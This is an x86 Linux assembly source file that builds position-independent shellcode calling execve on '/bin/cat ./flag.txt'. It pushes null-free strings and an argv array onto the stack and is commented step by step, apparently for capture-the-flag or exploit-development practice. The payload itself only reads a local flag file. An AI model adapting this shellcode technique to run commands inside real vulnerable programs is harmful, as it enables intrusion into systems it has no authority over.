; Filename: execve-cat-flag_Stack.asm
; Author: Cameron, James
; Purpose: Demonstrate execve /bin/cat ./flag.txt shellcode using Stack technique
; Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
;            Ubuntu 12.04.4 LTS



section .text

global _start

_start:
            ; int execve(const char *filename, char *const argv[],
            ;            char *const envp[]);
            ; #define __NR_execve              11

	    ;            fname                      argv      envp
	    ; stack: [////bin/catA][.//flag.txtB][CCCC][DDDD][null]

	xor eax, eax            ; set eax = 0
	push eax                ; push null (envp / terminate argv)
	mov edx, esp            ; set envp
	push 0x44444444         ; DDDD (argv[1])
	push 0x43434343         ; CCCC (argv[0])
	mov ecx, esp            ; set ecx to argv

	; .//flag.txtB
	push 0x42747874         ; Btxt
	push 0x2e67616c         ; .gal
	push 0x662f2f2e         ; f//.
	mov byte [esp + 11], al ; null terminate ./flag.txt
	mov [esp + 16], esp     ; replace DDDD with argv[1]

	; ////bin/catA
	push 0x41746163         ; Atac
	push 0x2f6e6962         ; /nib
	push 0x2f2f2f2f         ; ////
	mov byte [esp + 11], al ; null terminate /bin/cat
	mov [esp + 24], esp     ; replace CCCC with argv[0]

	mov al, 0xb             ; set eax to execve syscall
	mov ebx, esp            ; set ebx to filename
	int 0x80                ; execute syscall
	
